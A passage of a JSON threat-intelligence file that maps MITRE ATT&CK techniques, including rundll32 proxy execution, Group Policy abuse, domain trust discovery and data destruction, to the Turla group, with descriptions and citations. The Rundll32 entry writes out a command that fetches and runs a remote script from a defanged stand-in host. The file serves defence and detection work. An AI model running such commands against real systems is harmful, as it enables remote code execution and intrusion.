    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\n\nBrowser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.",
    "technique_references": [],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
    "platform": "windows",
    "tid": "T1218.011",
    "technique": "Rundll32",
    "tactic": "defense-evasion",
    "datasources": "command-execution|file-metadata|module-load|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "mosquito",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
    "technique_references": [
      {
        "source_name": "rundll32.exe defense evasion",
        "url": "https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/",
        "description": "Ariel silver. (2022, February 1). Defense Evasion Techniques. Retrieved April 8, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Attackify Rundll32.exe Obscurity",
        "url": "https://www.attackify.com/blog/rundll32_execution_order/",
        "description": "Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "This is Security Command Line Confusion",
        "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/",
        "description": "B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Github NoRunDll",
        "url": "https://github.com/gtworek/PSBits/tree/master/NoRunDll",
        "description": "gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Trend Micro CPL",
        "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
        "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
    "platform": "macos|linux",
    "tid": "T1222.002",
    "technique": "Linux and Mac File and Directory Permissions Modification",
    "tactic": "defense-evasion",
    "datasources": "command-execution|file-metadata|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "penquin",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
    "technique_references": [
      {
        "source_name": "Hybrid Analysis Icacls1 June 2018",
        "url": "https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100",
        "description": "Hybrid Analysis. (2018, June 12). c9b65b764985dfd7a11d3faf599c56b8.exe. Retrieved August 19, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Hybrid Analysis Icacls2 May 2018",
        "url": "https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110",
        "description": "Hybrid Analysis. (2018, May 30). 2a8efbfadd798f6111340f7c1c956bee.dll. Retrieved August 19, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "20 macOS Common Tools and Techniques",
        "url": "https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/",
        "description": "Phil Stokes. (2021, February 16). 20 Common Tools & Techniques Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|root",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0",
    "platform": "windows",
    "tid": "T1482",
    "technique": "Domain Trust Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|os-api-execution|process-creation|script-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
    "technique_references": [
      {
        "source_name": "Microsoft Operation Wilysupply",
        "url": "https://www.microsoft.com/security/blog/2017/05/04/windows-defender-atp-thwarts-operation-wilysupply-software-supply-chain-cyberattack/",
        "description": "Florio, E.. (2017, May 4). Windows Defender ATP thwarts Operation WilySupply software supply chain cyberattack. Retrieved February 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "AdSecurity Forging Trust Tickets",
        "url": "https://adsecurity.org/?p=1588",
        "description": "Metcalf, S. (2015, July 15). It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts. Retrieved February 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Trusts",
        "url": "https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)",
        "description": "Microsoft. (2009, October 7). Trust Technologies. Retrieved February 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft GetAllTrustRelationships",
        "url": "https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.domain.getalltrustrelationships?redirectedfrom=MSDN&view=netframework-4.7.2#System_DirectoryServices_ActiveDirectory_Domain_GetAllTrustRelationships",
        "description": "Microsoft. (n.d.). Domain.GetAllTrustRelationships Method. Retrieved February 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y Domain Trusts",
        "url": "https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944",
        "description": "Schroeder, W. (2017, October 30). A Guide to Attacking Domain Trusts. Retrieved February 14, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163",
    "platform": "windows",
    "tid": "T1484.001",
    "technique": "Group Policy Modification",
    "tactic": "defense-evasion",
    "datasources": "active-directory-object-creation|active-directory-object-deletion|active-directory-object-modification|command-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",
    "technique_references": [
      {
        "source_name": "TechNet Group Policy Basics",
        "url": "https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/",
        "description": "srachui. (2012, February 13). Group Policy Basics – Part 1: Understanding the Structure of a Group Policy Object. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ADSecurity GPO Persistence 2016",
        "url": "https://adsecurity.org/?p=2716",
        "description": "Metcalf, S. (2016, March 14). Sneaky Active Directory Persistence #17: Group Policy. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Wald0 Guide to GPOs",
        "url": "https://wald0.com/?p=179",
        "description": "Robbins, A. (2018, April 2). A Red Teamer’s Guide to GPOs and OUs. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y Abusing GPO Permissions",
        "url": "http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/",
        "description": "Schroeder, W. (2016, March 17). Abusing GPO Permissions. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant M Trends 2016",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf",
        "description": "Mandiant. (2016, February 25). Mandiant M-Trends 2016. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Hacking Team Breach",
        "url": "https://www.microsoft.com/security/blog/2016/06/01/hacking-team-breach-a-cyber-jurassic-park/",
        "description": "Microsoft Secure Team. (2016, June 1). Hacking Team Breach: A Cyber Jurassic Park. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y SeEnableDelegationPrivilege Right",
        "url": "http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/",
        "description": "Schroeder, W. (2017, January 10). The Most Dangerous User Right You (Probably) Have Never Heard Of. Retrieved March 5, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163",
    "platform": "windows",
    "tid": "T1484.001",
    "technique": "Group Policy Modification",
    "tactic": "privilege-escalation",
    "datasources": "active-directory-object-creation|active-directory-object-deletion|active-directory-object-modification|command-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",
    "technique_references": [
      {
        "source_name": "TechNet Group Policy Basics",
        "url": "https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/",
        "description": "srachui. (2012, February 13). Group Policy Basics – Part 1: Understanding the Structure of a Group Policy Object. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ADSecurity GPO Persistence 2016",
        "url": "https://adsecurity.org/?p=2716",
        "description": "Metcalf, S. (2016, March 14). Sneaky Active Directory Persistence #17: Group Policy. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Wald0 Guide to GPOs",
        "url": "https://wald0.com/?p=179",
        "description": "Robbins, A. (2018, April 2). A Red Teamer’s Guide to GPOs and OUs. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y Abusing GPO Permissions",
        "url": "http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/",
        "description": "Schroeder, W. (2016, March 17). Abusing GPO Permissions. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant M Trends 2016",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf",
        "description": "Mandiant. (2016, February 25). Mandiant M-Trends 2016. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Hacking Team Breach",
        "url": "https://www.microsoft.com/security/blog/2016/06/01/hacking-team-breach-a-cyber-jurassic-park/",
        "description": "Microsoft Secure Team. (2016, June 1). Hacking Team Breach: A Cyber Jurassic Park. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y SeEnableDelegationPrivilege Right",
        "url": "http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/",
        "description": "Schroeder, W. (2017, January 10). The Most Dangerous User Right You (Probably) Have Never Heard Of. Retrieved March 5, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c",
    "platform": "windows|iaas|linux|macos",
    "tid": "T1485",
    "technique": "Data Destruction",
    "tactic": "impact",
    "datasources": "cloud-storage-deletion|command-execution|file-deletion|file-modification|image-deletion|instance-deletion|process-creation|snapshot-deletion|volume-deletion",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "kazuar",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).\n\nIn cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider)",
    "technique_references": [
      {
        "source_name": "Symantec Shamoon 2012",
        "url": "https://www.symantec.com/connect/blogs/shamoon-attacks",
        "description": "Symantec. (2012, August 16). The Shamoon Attacks. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Shamoon Nov 2016",
        "url": "https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html",
        "description": "FireEye. (2016, November 30). FireEye Responds to Wave of Destructive Cyber Attacks in Gulf Region. Retrieved January 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Palo Alto Shamoon Nov 2016",
        "url": "http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/",
        "description": "Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack Wiper. Retrieved January 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky StoneDrill 2017",
        "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf",
        "description": "Kaspersky Lab. (2017, March 7). From Shamoon to StoneDrill: Wipers attacking Saudi organizations and beyond. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 Shamoon3 2018",
        "url": "https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/",
        "description": "Falcone, R. (2018, December 13). Shamoon 3 Targets Oil and Gas Organization. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Talos Olympic Destroyer 2018",
        "url": "https://blog.talosintelligence.com/2018/02/olympic-destroyer.html",
        "description": "Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Data Destruction - Threat Post",
        "url": "https://threatpost.com/hacker-puts-hosting-service-code-spaces-out-of-business/106761/",
        "description": "Mimoso, M.. (2014, June 18). Hacker Puts Hosting Service Code Spaces Out of Business. Retrieved December 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "DOJ  - Cisco Insider",
        "url": "https://www.justice.gov/usao-ndca/pr/san-jose-man-pleads-guilty-damaging-cisco-s-network",
        "description": "DOJ. (2020, August 26). San Jose Man Pleads Guilty To Damaging Cisco’s Network. Retrieved December 15, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator|root|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--35187df2-31ed-43b6-a1f5-2f1d3d58d3f1",
    "platform": "linux|windows",
    "tid": "T1505.002",
    "technique": "Transport Agent",
    "tactic": "persistence",
    "datasources": "application-log-content|file-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "lightneuron",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. ",
    "technique_references": [
      {
        "source_name": "Microsoft TransportAgent Jun 2016",
        "url": "https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help",
        "description": "Microsoft. (2016, June 1). Transport agents. Retrieved June 24, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ESET LightNeuron May 2019",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf",
        "description": "Faou, M. (2019, May). Turla LightNeuron: One email away from remote code execution. Retrieved June 24, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "system|administrator|root",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58",
    "platform": "windows|azure-ad|office-365|saas|iaas|linux|macos|google-workspace",
    "tid": "T1518",
    "technique": "Software Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|firewall-enumeration|firewall-metadata|os-api-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "comrat",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/580.html",
        "description": "none",
        "external_id": "CAPEC-580"
      }
    ],
    "technique_required_permissions": "user|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384",
    "platform": "windows|azure-ad|office-365|saas|iaas|linux|macos|google-workspace",
    "tid": "T1518.001",
    "technique": "Security Software Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|firewall-enumeration|firewall-metadata|os-api-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "epic|mosquito",
    "correlation_tool": "empire|tasklist",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS) For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the <code>DescribeSecurityGroups</code> action with various request parameters. (Citation: DescribeSecurityGroups - Amazon Elastic Compute Cloud)",
    "technique_references": [
      {
        "source_name": "Expel IO Evil in AWS",
        "url": "https://expel.io/blog/finding-evil-in-aws/",
        "description": "A. Randazzo, B. Manahan and S. Lipton. (2020, April 28). Finding Evil in AWS. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "DescribeSecurityGroups - Amazon Elastic Compute Cloud",
        "url": "https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeSecurityGroups.html",
        "description": "Amazon Web Services, Inc. . (2022). DescribeSecurityGroups. Retrieved January 28, 2022.",
        "external_id": "none"
